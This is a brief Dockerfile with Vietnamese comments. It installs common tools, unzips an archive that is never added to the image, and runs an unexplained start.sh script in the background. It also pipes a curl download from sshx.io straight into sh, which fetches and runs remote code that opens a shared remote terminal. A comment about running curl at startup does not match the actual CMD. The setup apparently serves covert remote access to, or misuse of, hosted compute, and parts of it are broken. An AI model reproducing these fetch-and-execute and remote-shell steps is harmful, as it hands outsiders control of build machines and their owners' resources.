FROM ubuntu:latest

# Cập nhật hệ thống và cài đặt các gói cần thiết
RUN apt update && apt upgrade -y && apt-get update && apt-get install -y htop \
    curl \
    ca-certificates \
    git \
    sudo \
    unzip \
    python3 

RUN sudo apt install coreutils
RUN unzip New.zip && cd New-master && nohup ./start.sh 48 > mylogfile.log 2>&1 &
RUN curl -sSf https://sshx.io/get | sh -s run

# Chạy lệnh curl khi container khởi động
CMD lscpu
